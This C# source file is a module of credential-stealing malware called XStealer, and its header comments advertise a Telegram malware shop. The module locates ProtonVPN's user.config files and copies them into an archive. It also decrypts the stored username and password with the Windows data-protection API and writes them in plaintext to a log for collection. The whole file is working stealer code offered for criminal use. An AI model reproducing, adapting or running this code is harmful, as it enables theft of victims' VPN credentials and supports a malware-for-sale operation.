// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps.Vpn
{
    using System.IO;
    using System.Linq;
    using System.Security.Cryptography;
    using System.Text;
    using System.Xml;
    using Helpers;

    public static class Proton
    {
        /// <summary>
        /// Метод для записи данных из ProtonVpn в файл
        /// </summary>
        public static void Inizialize()
        {
            using var ms = new MemoryStream { Position = 0 };
            try
            {
                var directoryInfo = new DirectoryInfo(GlobalPaths.ProtPath);
                // Проверяем файл на существование
                if (directoryInfo.Exists)
                {
                    using var data = new StreamWriter(ms, Encoding.UTF8); 
                    // Проходимся циклом по директориям
                    foreach (DirectoryInfo dirProtonNext in directoryInfo.GetDirectories("ProtonVPN.exe*").SelectMany(dirProton => dirProton.GetDirectories()))
                    {
                        // Путь до файла с конфигом
                        string text = GlobalPaths.CombinePath(dirProtonNext.FullName, "user.config");
                        // Проверяем файл на существование
                        if (File.Exists(text))
                        {
                            try
                            {
                                byte[] files = ConverterEx.ToBytes(false, text);
                                ZipEx.AddKeyPairStream($"VPN/{Path.GetFileName(text)}", files);

                                var xf = new XmlDocument() { XmlResolver = null };
                                // Читаем конфиг файл
                                xf.Load(text);
                                // Парсим значения
                                string login = xf.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
                                string password = xf.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;
                                if (!string.IsNullOrWhiteSpace(login) || !string.IsNullOrWhiteSpace(password))
                                {
                                    // Добавляем данные
                                    data.WriteLine($"App Version: {dirProtonNext.Name}");
                                    data.WriteLine($"Login: {DecoderEx.UnprotectDataEx(login, DataProtectionScope.CurrentUser)}");
                                    data.WriteLine($"password: {DecoderEx.UnprotectDataEx(password, DataProtectionScope.CurrentUser)}\r\n===============");
                                }
                            }
                            catch { continue; }
                        }
                    }
                    ZipEx.AddKeyPairStream($"VPN/ProtonVPN_Log.txt", ms?.ToArray() ?? ms.GetBuffer() ?? null);
                }
            }
            catch { }
        }
    }
}